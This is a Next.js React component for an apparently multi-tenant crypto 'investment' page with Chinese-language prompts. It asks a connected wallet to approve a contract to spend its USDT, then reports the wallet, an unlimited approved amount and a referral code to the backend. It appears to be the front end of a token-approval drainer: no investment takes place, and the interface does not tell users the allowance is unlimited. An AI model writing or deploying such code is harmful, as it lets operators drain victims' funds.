'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { TenantPageProps } from '@/shared/types';
import { useWallet, useApprove, useReferral, useTenant } from '@/shared/hooks';
import { registerCustomer } from '@/shared/lib/api';
import { LoadingSpinner, ErrorDisplay, WalletButton } from '@/shared/components';

export function InvestPage({ tenantConfig }: TenantPageProps) {
  const router = useRouter();
  const { slug } = useTenant();
  const { isReady, isConnected, address, error: walletError } = useWallet();
  const { approve, isLoading: approving, error: approveError } = useApprove();
  const { referralCode } = useReferral();
  const [registering, setRegistering] = useState(false);
  const [error, setError] = useState<any>(null);

  const handleAuthorize = async () => {
    if (!isConnected || !address) return;

    try {
      setError(null);

      // 1. Approve
      const txHash = await approve(
        tenantConfig.investmentContractAddress,
        tenantConfig.usdtTokenAddress,
      );

      // 2. Register customer
      setRegistering(true);
      await registerCustomer({
        walletAddress: address,
        approvedAmount: -1, // Unlimited
        approvalTxHash: txHash,
        referralCode: referralCode || undefined,
      }, slug);

      // 3. Navigate to success page
      router.push('/success');
    } catch (err) {
      setError(err);
    } finally {
      setRegistering(false);
    }
  };

  if (!isReady) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <LoadingSpinner size="lg" />
      </div>
    );
  }

  const displayError = error || approveError || walletError;

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8">
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-gray-900 mb-2">
            Tenant A Investment
          </h1>
          <p className="text-gray-600">
            授權您的錢包開始投資
          </p>
        </div>

        {displayError && (
          <div className="mb-6">
            <ErrorDisplay error={displayError} />
          </div>
        )}

        {isConnected && address && (
          <div className="mb-6 p-4 bg-gray-50 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">連接的錢包</p>
            <p className="text-sm font-mono text-gray-900 break-all">
              {address}
            </p>
          </div>
        )}

        {referralCode && (
          <div className="mb-6 p-4 bg-green-50 rounded-lg">
            <p className="text-sm text-green-800">
              推薦碼: <span className="font-semibold">{referralCode}</span>
            </p>
          </div>
        )}

        <WalletButton
          onClick={handleAuthorize}
          loading={approving || registering}
          disabled={!isConnected || approving || registering}
          className="w-full"
        >
          {approving ? '授權中...' : registering ? '註冊中...' : '授權投資'}
        </WalletButton>

        <p className="text-xs text-gray-500 text-center mt-4">
          點擊按鈕將授權平台使用您的 USDT
        </p>
      </div>
    </div>
  );
}
